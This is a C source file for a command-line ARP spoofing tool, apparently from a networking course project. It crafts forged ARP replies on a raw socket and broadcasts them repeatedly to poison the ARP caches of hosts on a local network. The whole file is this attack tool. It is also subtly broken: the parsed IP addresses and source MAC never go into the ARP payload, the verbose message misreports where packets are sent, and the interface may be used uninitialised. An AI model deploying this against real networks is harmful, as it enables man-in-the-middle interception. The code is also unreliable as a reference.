#include "inquisitor.h"

#define IP4LEN 4
#define PKTLEN sizeof(struct ether_header) + sizeof(struct ether_arp)

int	sock;

static void	usage(void)
{
	fprintf(stderr, "Usage: ./arp-spoof [-h] [-i interface] [-v]\n");
	fprintf(stderr, "Options:\n");
	fprintf(stderr, "  -h\t\tPrint this help message\n");
	fprintf(stderr, "  -i interface\tSpecify the interface to use\n");
	fprintf(stderr, "  -v\t\tVerbose mode\n");
}

static void	sigint_handler(int signum)
{
	(void)signum;
	close(sock);
	printf("\n");
	exit(0);
}

static void	set_arp_spoof(const char *dev, char *ip_src, char *mac_src, char *ip_target, char *mac_target, bool verbose)
{
	char				packet[PKTLEN];
	struct ether_header	*eth;
	struct ether_arp	*arp;
	struct sockaddr_ll	device;
	u_char				source_ip[IP4LEN];
	u_char				target_ip[IP4LEN];
	u_char				source_mac[MAC_ADDR_LEN];
	u_char				target_mac[MAC_ADDR_LEN];
	int					elapsed_time;

	if ((sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		perror("socket");
		exit(1);
	}
	if (!inet_pton(AF_INET, ip_src, source_ip))
	{
		fprintf(stderr, "Invalid IP address format for source IP: %s\n", ip_src);
		exit(1);
	}
	if (!inet_pton(AF_INET, ip_target, target_ip))
	{
		fprintf(stderr, "Invalid IP address format for target IP: %s\n", ip_target);
		exit(1);
	}
	if (sscanf(mac_src, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
				&source_mac[0], &source_mac[1], &source_mac[2],
				&source_mac[3], &source_mac[4], &source_mac[5]) != 6)
	{
		fprintf(stderr, "Invalid MAC address format for source MAC: %s\n", mac_src);
		exit(1);
	}
	if (sscanf(mac_target, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
				&target_mac[0], &target_mac[1], &target_mac[2],
				&target_mac[3], &target_mac[4], &target_mac[5]) != 6)
	{
		fprintf(stderr, "Invalid MAC address format for target MAC: %s\n", mac_target);
		exit(1);
	}
	elapsed_time = 0;
	eth = (struct ether_header *)packet;
	arp = (struct ether_arp *)(packet + sizeof(struct ether_header));
	memset(packet, 0, PKTLEN);
	memset(eth->ether_dhost, 0xff, ETH_ALEN);
	memcpy(eth->ether_shost, source_mac, ETH_ALEN);
	eth->ether_type = htons(ETH_P_ARP);
	arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
	arp->ea_hdr.ar_pro = htons(ETH_P_IP);
	arp->ea_hdr.ar_hln = ETH_ALEN;
	arp->ea_hdr.ar_pln = IP4LEN;
	arp->ea_hdr.ar_op = htons(ARPOP_REPLY);
	memset(arp->arp_tha, 0xff, ETH_ALEN);
	memset(arp->arp_tpa, 0x00, IP4LEN);
	memset(&device, 0, sizeof(device));
	device.sll_ifindex = if_nametoindex(dev);
	device.sll_family = AF_PACKET;
	memcpy(device.sll_addr, source_mac, ETH_ALEN);
	device.sll_halen = htons(ETH_ALEN);
	while (elapsed_time < POISON_DURATION)
	{
		if (sendto(sock, packet, PKTLEN, 0, (struct sockaddr *)&device, sizeof(device)) < 0)
		{
			fprintf(stderr, "sendto: %s\n", strerror(errno));
			exit(1);
		}
		if (verbose)
			printf("Sent ARP packet to %s\n", ip_target);
		sleep(POISON_INTERVAL);
		elapsed_time += POISON_INTERVAL;
	}
}

int	main(int argc, char **argv)
{
	char		errbuf[PCAP_ERRBUF_SIZE];
	const char	*dev;
	char		*ip_src;
	char		*ip_target;
	char		*mac_src;
	char		*mac_target;
	bool		verbose;
	int			opt;

	if (getuid() != 0)
	{
		fprintf(stderr, "You must be root to use this program\n");
		return (1);
	}
	if (argc < 2)
	{
		usage();
		return (1);
	}
	verbose = false;
	while ((opt = getopt(argc, argv, "hi:v")) != -1)
	{
		switch (opt)
		{
			case 'h':
				usage();
				return (0);
			case 'i':
				dev = optarg;
				break ;
			case 'v':
				verbose = true;
				break ;
			default:
				usage();
				return (1);
		}
	}
	if (argc - optind < 4)
	{
		usage();
		return (1);
	}
	ip_src = argv[optind];
	mac_src = argv[optind + 1];
	ip_target = argv[optind + 2];
	mac_target = argv[optind + 3];
	signal(SIGINT, sigint_handler);
	set_arp_spoof(dev, ip_src, mac_src, ip_target, mac_target, verbose);
	(void)errbuf;
	return (0);
}
